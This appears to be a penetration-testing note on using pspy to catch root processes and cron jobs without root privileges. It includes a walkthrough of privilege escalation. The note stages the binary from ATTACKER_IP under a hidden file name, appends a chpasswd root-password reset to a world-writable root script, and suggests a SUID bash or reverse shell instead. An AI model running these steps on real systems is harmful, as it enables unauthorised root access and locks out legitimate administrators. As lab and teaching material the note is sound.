# PSPY — Watching Processes Without Root

A snapshot tool tells you what is on disk. `pspy` tells you what is **running**, including commands started by root, without needing root yourself. Reach for it the moment the file-based sweeps come back stock, and any time an empty result could mean "not permitted to see it".

```text
https://github.com/dominicbreuker/pspy
```

## The problem it solves

A cron job that fires every minute, runs `tar`, and exits in 40 milliseconds is invisible to every tool that takes a snapshot. `ps aux` shows it only if you happen to type it inside that 40 ms window, and the job's definition lives in `/var/spool/cron/crontabs/root` — mode 600, which you will not read. So the job exists, matters, and leaves no trace you can reach.

`pspy` catches it while it is alive.

## What it actually does — and does not

**It watches process creation, not cron.** `pspy` never opens `/etc/crontab`, `/etc/cron.d/`, or any crontab file. It reports processes. Cron jobs show up because a cron job *is* a process when it runs — and so are systemd timers, another user's interactive commands, and a daemon's children. Nothing labels a line as a cron job; **you** infer it from the same command line repeating on a fixed interval.

**It is not purely event-driven, and it is not pure polling either.** Two mechanisms run together:

```text
1. inotify watches on /usr /tmp /etc /home /var /opt   (recursive, the defaults)
   -> a filesystem event fires an immediate /proc scan
2. a /proc scan on a fixed interval, regardless of events
   -> the safety net for events that never arrive
```

Mechanism 1 is what makes it beat polling: a starting process almost always touches the filesystem, so inotify delivers the "look now" signal at precisely the right instant. Turning the interval down without understanding this is the common mistake — the interval is the backstop, not the engine.

**It does not bypass any permission.** On a stock Linux host, `/proc/<pid>/cmdline` and `/proc/<pid>/status` are readable by everyone; that is how `ps` shows you other users' processes at all. `pspy` reads exactly what any user could read, only fast enough to catch processes that are about to disappear.

## Getting it onto the host

First, once, onto **your** box — the target has no internet, you do:

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```

Then serve the directory it landed in (`python3 -m http.server 8000`) and pull it onto the target:

```bash
wget -q http://ATTACKER_IP:8000/pspy64 -O /tmp/.p && chmod +x /tmp/.p
```

```bash
file /tmp/.p
```

- four binaries ship on the releases page: `pspy32`, `pspy64` (around 4 MB) and the [[Security-Terms#^upx|UPX]]-compressed `pspy32s`, `pspy64s` (around 1 MB, same `latest/download/` path). The small ones matter on a slow or awkward transfer.
- `-O /tmp/.p` → a short, dot-prefixed name. It keeps the binary out of a casual `ls` and out of the way of a `noexec` mount if you have to move it; check `mount | grep /tmp` first, because a `noexec` `/tmp` produces a permission error that reads like a missing execute bit.
- `file` before running it → **not optional.** A GitHub *page* saved instead of the release asset is HTML, and it produces a syntax error that looks like a broken tool rather than a broken download. This one check saves the twenty minutes normally spent debugging the wrong thing.
- `uname -m` on the target first → an `aarch64` host will not run the `pspy64` [[Security-Terms#^x86-64|x86-64]] build, and the failure message names an exec format problem rather than an architecture one.

## Watch, and wait long enough

```bash
/tmp/.p -pf -i 1000 -c
```

- `-p` → print commands. On by default; naming it explicitly makes the intent readable when you paste the command back into notes.
- `-f` → also print filesystem events. Noisy, but it shows *what the job touched*, which is often the only way to find the script when the command line itself is just a wrapper.
- `-i <ms>` → milliseconds between the unconditional `/proc` scans. This is the backstop, not the engine; lowering it below about 100 costs CPU and catches very little that inotify missed.
- `-r <dirs>` → directories to watch recursively, defaulting to `/usr /tmp /etc /home /var /opt`. Worth extending when the application lives somewhere unusual, such as `/srv` or `/data`.
- `-c` → colour by [[Security-Terms#^uid|UID]], which makes `UID=0` lines findable at a glance in a wall of output.
- give it at least one full plausible interval. A minute covers a lab job; a job you have not waited for looks exactly like a job that does not exist.

> [!important]
> If `/proc` is mounted with `hidepid=1` or `hidepid=2`, other users' process directories are hidden and `pspy` sees only your own processes. Check with `mount | grep proc` **before** concluding a host has no root jobs. An empty run on a `hidepid` host is not a negative result; it is no result at all, and it should be recorded that way.

## Worked case — a writable root script caught while it ran

Running as an ordinary user, with the binary already staged:

```text
2026/02/10 06:40:16 CMD: UID=0  PID=1937 | /bin/bash /root/run-backup.sh
2026/02/10 06:40:16 CMD: UID=0  PID=1942 | /bin/bash /root/run-rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0  PID=1943 | /bin/bash /usr/local/bin/rm-tmp.sh
```

Two of those paths are under `/root` and unreadable. The third is not — and it is only because `pspy` printed the wrapper's **child** that you know root executes anything in `/usr/local/bin` at all. Nothing readable on the filesystem named that path.

```bash
ls -la /usr/local/bin/rm-tmp.sh
```

```bash
# -rwxrwxrwx 1 root root 57 Jan 20 10:27 /usr/local/bin/rm-tmp.sh
```

Root-owned, world-writable, executed by root on a loop. Both halves of the [[Cron-Jobs]] condition hold, so the escalation is to **append** a payload rather than replace the file:

```bash
echo 'echo "root:newpass" | chpasswd' >> /usr/local/bin/rm-tmp.sh
```

- `>>` not `>` → the script keeps doing its real job, so nothing on the host visibly breaks while you have the shell.
- wait one full interval before testing. The 60-second rhythm you measured from the timestamps is how long the payload takes to become true.

> [!warning]
> `chpasswd` replaces the real root password. Convenient in a lab, destructive anywhere else: it locks out the legitimate administrator and is trivially visible in an audit. Prefer a payload that adds access rather than replacing a credential — `chmod +s /bin/bash`, or a reverse shell. Options and trade-offs in [[Cron-Jobs]] and [[Shells]].
